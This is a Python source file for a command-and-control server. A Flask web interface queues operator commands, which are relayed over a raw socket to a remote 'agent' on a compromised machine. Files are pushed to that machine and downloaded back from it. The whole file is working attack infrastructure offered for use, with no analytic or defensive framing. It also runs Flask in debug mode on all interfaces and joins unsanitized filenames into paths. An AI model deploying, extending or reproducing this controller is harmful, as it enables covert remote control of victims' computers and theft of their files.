import os
import queue
import socket
import threading

from c2_server import C2Server
from flask import Flask, jsonify, request, send_file, send_from_directory

app = Flask(__name__)

# save communication between server - agent
command_queue = queue.Queue()
response_queue = queue.Queue()

# create file directories
os.makedirs("uploads", exist_ok=True)
os.makedirs("downloads", exist_ok=True)


class WebC2Server(C2Server):
    def __init__(self, host, port):
        super().__init__(host, port)

    def start_server(self):
        serversocket = socket.socket()
        serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serversocket.bind((self.host, self.port))
        serversocket.listen(1)
        print(f"[*] Listening on {self.host}:{self.port}")

        conn, addr = serversocket.accept()
        print(f"[*] Connection from {addr}")

        def handle_client():
            try:
                while True:
                    command = command_queue.get()
                    if command.lower() in ["exit", "quit"]:
                        conn.send(command.encode())
                        break

                    if command.startswith("upload "):
                        filename = command.split(" ", 1)[1]
                        full_path = os.path.join("uploads", filename)
                        if not os.path.exists(full_path):
                            response_queue.put(f"[!] File not found: {filename}")
                            continue

                        conn.send(command.encode())
                        ready = conn.recv(1024)
                        if b"[READYFORFILE]" not in ready:
                            response_queue.put("[!] Agent not ready to receive file.")
                            continue

                        filesize = os.path.getsize(full_path)
                        conn.send(str(filesize).zfill(10).encode())
                        with open(full_path, "rb") as f:
                            while chunk := f.read(1024):
                                conn.sendall(chunk)
                        response_queue.put(f"[+] File {filename} uploaded.")
                        continue

                    conn.send(command.encode())

                    if command.startswith("download "):
                        filename = command.split(" ", 1)[1]
                        self.receive_file(conn, os.path.join("downloads", filename))
                        response_queue.put(f"[+] File {filename} downloaded.")
                        continue

                    output = conn.recv(4096).decode()
                    response_queue.put(output)

            except Exception as e:
                response_queue.put(f"[!] Connection lost: {e}")
            finally:
                conn.close()
                serversocket.close()

        threading.Thread(target=handle_client, daemon=True).start()


c2_server = WebC2Server("0.0.0.0", 9999)
threading.Thread(target=c2_server.start_server, daemon=True).start()


# Flask Configuration


@app.route("/send_command", methods=["POST"])
def send_command():
    data = request.json
    command = data.get("command")  # pyright: ignore
    if not command:
        return jsonify({"error": "No command provided"}), 400
    command_queue.put(command)
    return jsonify({"status": "Command queued"}), 200


@app.route("/get_response", methods=["GET"])
def get_response():
    try:
        response = response_queue.get_nowait()
        return jsonify({"response": response})
    except queue.Empty:
        return jsonify({"response": None})


@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("file")
    if not file:
        return jsonify({"error": "No file uploaded"}), 400
    save_path = os.path.join("uploads", file.filename)  # pyright: ignore
    file.save(save_path)
    return jsonify({"status": "File uploaded", "filename": file.filename})


@app.route("/download/<filename>", methods=["GET"])
def download(filename):
    filepath = os.path.join("downloads", filename)
    if not os.path.exists(filepath):
        return jsonify({"error": "File not found"}), 404
    return send_file(filepath, as_attachment=True)


@app.route("/")
def index():
    return send_from_directory("static", "index.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True, use_reloader=False)
